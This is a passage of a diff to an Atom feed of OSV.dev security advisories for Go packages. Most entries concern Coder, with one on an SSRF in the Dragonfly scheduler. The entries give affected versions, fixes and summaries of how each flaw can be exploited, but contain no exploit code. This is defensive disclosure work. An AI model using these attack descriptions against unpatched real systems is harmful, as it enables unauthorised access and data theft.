@@ -3,12 +3,462 @@
   <title>OSV — new &amp; updated vulnerabilities: Go</title>
   <subtitle>Open-source vulns affecting Go packages, last 48h. Source: OSV.dev (CC-BY-4.0).</subtitle>
   <id>tag:cshintov.github.io,2026:osv-rss:go</id>
-  <updated>2026-07-06T19:30:10Z</updated>
+  <updated>2026-07-06T22:00:09Z</updated>
   <link rel="self" href="https://cshintov.github.io/osv-rss/go.xml"/>
   <link rel="alternate" href="https://osv.dev/"/>
   <author><name>osv-rss (data from OSV.dev)</name></author>
   <rights>Vulnerability data from OSV.dev and upstream sources (e.g. GitHub Advisory Database), licensed CC-BY-4.0.</rights>
   <generator uri="https://github.com/cshintov/osv-rss">osv-rss</generator>
+  <entry>
+    <title>[NEW] GHSA-qrwj-vh9x-gw5v: Coder's workspace agent API insecure redirect handling allowed cross-agent file read and write</title>
+    <id>https://osv.dev/vulnerability/GHSA-qrwj-vh9x-gw5v</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-qrwj-vh9x-gw5v"/>
+    <published>2026-07-06T21:52:31Z</published>
+    <updated>2026-07-06T22:00:09Z</updated>
+    <category term="Go"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Coder&amp;#x27;s workspace agent API insecure redirect handling allowed cross-agent file read and write&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.4&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.10&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.32.9&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.29.19&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+`agentConn.apiClient()` used the default redirect behavior of `http.Client` while its custom transport dialed the host from the request URL as long as the port was the workspace agent HTTP API port (`4`). Agent tailnet IPs are deterministic from agent UUIDs, so a malicious workspace agent could return a redirect to another agent&amp;#x27;s tailnet IP and cause the control-plane client to send the follow-up workspace agent API request to the victim agent instead of the intended agent.
+
+Redirects that preserve the method and body, such as HTTP 307 and 308, allow replay of write and process-start requests. HTTP 301, 302 and 303 redirects only convert POST requests to GET requests, so they are sufficient to demonstrate redirected reads but not write or command-execution primitives.
+
+### Im…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-qrwj-vh9x-gw5v"&gt;https://github.com/coder/coder/security/advisories/GHSA-qrwj-vh9x-gw5v&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/26600"&gt;https://github.com/coder/coder/pull/26600&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-qrwj-vh9x-gw5v"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-5wg6-jmq2-53pw: Coder's workspace app CORS origin check can be bypassed via UUID-based subdomain spoofing</title>
+    <id>https://osv.dev/vulnerability/GHSA-5wg6-jmq2-53pw</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-5wg6-jmq2-53pw"/>
+    <published>2026-07-06T21:14:49Z</published>
+    <updated>2026-07-06T21:30:08Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-55438"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Coder&amp;#x27;s workspace app CORS origin check can be bypassed via UUID-based subdomain spoofing&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55438&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:N/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.8&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.32.7&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.29.17&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+Coder&amp;#x27;s subdomain-based workspace app proxy allowed the same-owner CORS check to be bypassed. When a workspace-name subdomain segment parsed as a UUID, the workspace was resolved by ID without confirming the URL&amp;#x27;s username matched the real owner, while the CORS middleware trusted the unverified username in the hostname.
+
+&amp;gt; **Note:** Practical exploitation requires subdomain app routing (wildcard hostname) enabled and a victim who visits the attacker&amp;#x27;s crafted app URL while authenticated.
+
+### Impact
+
+An authenticated user could craft a subdomain encoding their own workspace UUID and a victim&amp;#x27;s username. If the victim visited the attacker&amp;#x27;s URL, the attacker&amp;#x27;s JavaScript could issue credentialed cross-origin `fetch()` requests to the victim&amp;#x27;s workspace apps and read the respons…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-5wg6-jmq2-53pw"&gt;https://github.com/coder/coder/security/advisories/GHSA-5wg6-jmq2-53pw&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/26085"&gt;https://github.com/coder/coder/pull/26085&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/26086"&gt;https://github.com/coder/coder/pull/26086&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-5wg6-jmq2-53pw"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-84rm-42xw-mx52: Coder's AI Bridge Proxy skips TLS certificate verification in default configuration</title>
+    <id>https://osv.dev/vulnerability/GHSA-84rm-42xw-mx52</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-84rm-42xw-mx52"/>
+    <published>2026-07-06T21:12:05Z</published>
+    <updated>2026-07-06T21:15:09Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-55436"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Coder&amp;#x27;s AI Bridge Proxy skips TLS certificate verification in default configuration&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55436&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.8&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.32.7&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+The AI Bridge Proxy (`aibridgeproxyd`) created a goproxy server whose default transport set `InsecureSkipVerify: true` and only assigned a secure transport when an upstream proxy was configured. In the default configuration (no upstream proxy), outbound HTTPS to the Coder access URL accepted any TLS certificate.
+
+&amp;gt; **Note:** Practical exploitation requires an on-path (man-in-the-middle) position between the AI Bridge Proxy and the Coder server. Deployments where they are co-located over loopback are effectively unaffected.
+
+### Impact
+
+An attacker positioned between the proxy and the Coder server, via ARP spoofing, DNS poisoning or control of proxy environment variables, could intercept injected Coder session tokens, user-supplied provider API keys (BYOK) and full request and …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-84rm-42xw-mx52"&gt;https://github.com/coder/coder/security/advisories/GHSA-84rm-42xw-mx52&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/26131"&gt;https://github.com/coder/coder/pull/26131&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-84rm-42xw-mx52"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-2mg2-p7r7-g27f: Coder: Zip upload decompression lacks aggregate size limit, enabling denial of service</title>
+    <id>https://osv.dev/vulnerability/GHSA-2mg2-p7r7-g27f</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-2mg2-p7r7-g27f"/>
+    <published>2026-07-06T21:06:45Z</published>
+    <updated>2026-07-06T21:15:08Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-55078"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Coder: Zip upload decompression lacks aggregate size limit, enabling denial of service&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55078&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.8&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.32.7&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.29.17&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+`POST /api/v2/files` converts zip uploads to tar in memory via `CreateTarFromZip`, which enforced a per-entry size limit but no aggregate limit on total decompressed output, writing to an unbounded in-memory buffer.
+
+&amp;gt; **Note:** Exploitation requires authenticated file-upload access and the impact is limited to availability (denial of service).
+
+### Impact
+
+An authenticated user could upload a zip within the 100 MiB upload limit but containing many highly compressible entries whose decompressed size exhausted memory, crashing `coderd` before any RBAC check. Repeated requests could keep the service unavailable. This is a denial of service; it does not allow data disclosure or code execution.
+
+### Patches
+
+The fix adds a metadata preflight check that sums projected entry sizes a…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-2mg2-p7r7-g27f"&gt;https://github.com/coder/coder/security/advisories/GHSA-2mg2-p7r7-g27f&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/25877"&gt;https://github.com/coder/coder/pull/25877&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-2mg2-p7r7-g27f"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-chwm-m7g7-685g: Dragonfly scheduler v1 and v2 gRPC unauthenticated SSRF via attacker-controlled PeerHost in DownloadTinyFile</title>
+    <id>https://osv.dev/vulnerability/GHSA-chwm-m7g7-685g</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-chwm-m7g7-685g"/>
+    <published>2026-07-06T20:32:33Z</published>
+    <updated>2026-07-06T21:15:08Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-54637"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Dragonfly scheduler v1 and v2 gRPC unauthenticated SSRF via attacker-controlled PeerHost in DownloadTinyFile&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-54637&lt;/p&gt;&lt;p&gt;Severity: CVSS_V4: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;d7y.io/dragonfly/v2&lt;/code&gt; — fixed in 2.4.4-rc.3&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;## Summary
+
+The Dragonfly **scheduler**&amp;#x27;s v1 gRPC service contains an unauthenticated Server-Side Request Forgery (SSRF). When a peer reports a successful download of a TINY task, the scheduler calls `Peer.DownloadTinyFile()` and issues an HTTP `GET` to a host and port taken verbatim from the attacker-controlled `PeerHost.Ip` / `PeerHost.DownPort` fields of the gRPC request body. The HTTP client uses a bare `http.Transport` with no address validation, so a remote, unauthenticated client can force the scheduler to connect to arbitrary internal addresses, including `127.0.0.1` (loopback), `169.254.0.0/16` (link-local, e.g. cloud metadata), and RFC1918 ranges. The fetched response is stored in `Task.DirectPiece` and can subsequently be served to other peers, making this a read-SSRF with a dat…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/dragonflyoss/dragonfly/security/advisories/GHSA-chwm-m7g7-685g"&gt;https://github.com/dragonflyoss/dragonfly/security/advisories/GHSA-chwm-m7g7-685g&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/dragonflyoss/dragonfly/security/advisories/GHSA-fhf9-m53m-863g"&gt;https://github.com/dragonflyoss/dragonfly/security/advisories/GHSA-fhf9-m53m-863g&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/dragonflyoss/Dragonfly2/blob/main/scheduler/resource/standard/peer.go#L457-L459"&gt;https://github.com/dragonflyoss/Dragonfly2/blob/main/scheduler/resource/standard/peer.go#L457-L459&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/dragonflyoss/dragonfly"&gt;https://github.com/dragonflyoss/dragonfly&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/internal/job/image.go#L211"&gt;https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/internal/job/image.go#L211&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/pkg/net/http/http.go#L50-L80"&gt;https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/pkg/net/http/http.go#L50-L80&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/pkg/rpc/scheduler/server/server.go#L71-L90"&gt;https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/pkg/rpc/scheduler/server/server.go#L71-L90&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/scheduler/resource/standard/peer.go#L435-L478"&gt;https://github.com/dragonflyoss/dragonfly/blob/0822e3aecc3369017d6b25c9441ff6f318129b31/scheduler/resource/standard/peer.go#L435-L478&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-chwm-m7g7-685g"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-wqxv-w64v-5wh6: Suspended Coder users retain access to AI Bridge LLM proxy endpoints</title>
+    <id>https://osv.dev/vulnerability/GHSA-wqxv-w64v-5wh6</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-wqxv-w64v-5wh6"/>
+    <published>2026-07-06T21:11:20Z</published>
+    <updated>2026-07-06T21:15:08Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-55435"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Suspended Coder users retain access to AI Bridge LLM proxy endpoints&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55435&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.8&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.32.7&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+AI Bridge proxy endpoints authenticate via `Server.IsAuthorized` in `coderd/aibridgedserver`, which validates key format, expiry, secret and deleted or system users but does not check whether the account is suspended. Because suspension does not revoke existing API keys, a suspended user&amp;#x27;s unexpired token keeps working.
+
+&amp;gt; **Note:** Practical impact is limited to already-issued API keys of suspended users until those keys are deleted.
+
+### Impact
+
+A suspended user with a previously issued long-lived token could continue calling AI Bridge LLM proxy endpoints, consuming paid provider resources billed to the deployment and, if injected MCP tools are enabled, invoking those tools. Access persists until the token expires, which may be months after suspension.
+
+### Patches
+
+The fix …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-wqxv-w64v-5wh6"&gt;https://github.com/coder/coder/security/advisories/GHSA-wqxv-w64v-5wh6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/26164"&gt;https://github.com/coder/coder/pull/26164&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-wqxv-w64v-5wh6"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-7qw2-f75v-62f7: Coder vulnerable to stored HTML injection via workspace agent logs in AgentLogLine component</title>
+    <id>https://osv.dev/vulnerability/GHSA-7qw2-f75v-62f7</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-7qw2-f75v-62f7"/>
+    <published>2026-07-06T21:12:56Z</published>
+    <updated>2026-07-06T21:15:08Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-55437"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Coder vulnerable to stored HTML injection via workspace agent logs in AgentLogLine component&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55437&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.8&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.32.7&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.29.17&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+The `AgentLogLine` dashboard component instantiated `ansi-to-html` without `escapeXML: true` and inserted the result via `dangerouslySetInnerHTML` so HTML embedded in workspace agent log lines was rendered as live markup. Server-side sanitization did not neutralize HTML metacharacters.
+
+&amp;gt; **Note:** Exploitation requires a victim to view attacker-controlled agent logs in the dashboard.
+
+### Impact
+
+A user who could run a workspace could emit arbitrary HTML into agent logs; when another user, including an administrator, viewed the workspace page, it rendered in their session. Content Security Policy blocked inline scripts but an attacker could still inject a `meta refresh` redirect, `style` rules for UI redressing or CSS-based exfiltration or external `img` beacons. This require…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-7qw2-f75v-62f7"&gt;https://github.com/coder/coder/security/advisories/GHSA-7qw2-f75v-62f7&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/25808"&gt;https://github.com/coder/coder/pull/25808&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-7qw2-f75v-62f7"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-x9qq-2qh5-8rxf: Coder's sub-agent app registration bypasses template port-sharing policy enforcement</title>
+    <id>https://osv.dev/vulnerability/GHSA-x9qq-2qh5-8rxf</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-x9qq-2qh5-8rxf"/>
+    <published>2026-07-06T21:08:32Z</published>
+    <updated>2026-07-06T21:15:08Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-55432"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Coder&amp;#x27;s sub-agent app registration bypasses template port-sharing policy enforcement&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55432&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.8&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.32.7&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.29.17&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+The `CreateSubAgent` RPC did not validate a requested app sharing level against the template&amp;#x27;s `MaxPortSharingLevel` before persisting workspace apps, letting a workspace owner exceed the administrator&amp;#x27;s configured maximum.
+
+&amp;gt; **Note:** Exploitation requires the ability to register sub-agent apps in a workspace the attacker controls.
+
+### Impact
+
+A workspace owner with an agent token could register a sub-agent app as `PUBLIC` even when the template&amp;#x27;s `MaxPortSharingLevel` was `owner`, exposing the app to unauthenticated users via the wildcard app domain. This affected only deployments using Enterprise port-sharing policy and wildcard app hostnames and required an authenticated workspace owner with an agent token.
+
+### Patches
+
+The fix clamps the sub-agent app sharing level to …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-x9qq-2qh5-8rxf"&gt;https://github.com/coder/coder/security/advisories/GHSA-x9qq-2qh5-8rxf&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/26061"&gt;https://github.com/coder/coder/pull/26061&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-x9qq-2qh5-8rxf"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-5g4w-3vw9-478w: Coder's subdomain workspace app routing trusts unauthenticated X-Forwarded-Host header, enabling cross-app data access</title>
+    <id>https://osv.dev/vulnerability/GHSA-5g4w-3vw9-478w</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-5g4w-3vw9-478w"/>
+    <published>2026-07-06T21:05:31Z</published>
+    <updated>2026-07-06T21:15:08Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-55430"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Coder&amp;#x27;s subdomain workspace app routing trusts unauthenticated X-Forwarded-Host header, enabling cross-app data access&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55430&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:N/A:N&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.8&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.32.7&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.29.17&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+The workspace app proxy resolves the target app from `httpapi.RequestHost()` which prefers the `X-Forwarded-Host` header over the real `Host` header. No middleware strips `X-Forwarded-Host` before routing and the header is not browser-forbidden so client-side JavaScript can set it on `fetch()` calls.
+
+&amp;gt; **Note:** Practical exploitation requires subdomain app routing (wildcard hostname) enabled, a victim who visits the attacker&amp;#x27;s shared app and a deployment whose upstream proxy does not strip `X-Forwarded-Host`.
+
+### Impact
+
+App session cookies are scoped to the wildcard parent domain so the browser attaches them to any app subdomain. An attacker who controls a shared workspace app can serve JavaScript that sends same-site requests with a forged `X-Forwarded-Host` pointing at a…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/security/advisories/GHSA-5g4w-3vw9-478w"&gt;https://github.com/coder/coder/security/advisories/GHSA-5g4w-3vw9-478w&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder/pull/26204"&gt;https://github.com/coder/coder/pull/26204&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://github.com/coder/coder"&gt;https://github.com/coder/coder&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/GHSA-5g4w-3vw9-478w"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] GHSA-f5vp-w269-392g: Coder vulnerable to denial of service via unbounded request body in AI Bridge provider endpoints</title>
+    <id>https://osv.dev/vulnerability/GHSA-f5vp-w269-392g</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/GHSA-f5vp-w269-392g"/>
+    <published>2026-07-06T21:10:13Z</published>
+    <updated>2026-07-06T21:15:08Z</updated>
+    <category term="Go"/>
+    <category term="CVE-2026-55434"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Coder vulnerable to denial of service via unbounded request body in AI Bridge provider endpoints&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Aliases: CVE-2026-55434&lt;/p&gt;&lt;p&gt;Severity: CVSS_V3: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.34.2&lt;/li&gt;&lt;li&gt;&lt;code&gt;github.com/coder/coder/v2&lt;/code&gt; — fixed in 2.33.8&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;### Summary
+
+AI Bridge provider handlers read request bodies with `io.ReadAll` without a maximum size so an authenticated user with AI Bridge access could send an arbitrarily large body and exhaust memory.
+
+&amp;gt; **Note:** Exploitation requires authenticated access to the AI Bridge endpoints and the impact is limited to availability (denial of service).
+
+### Impact
+
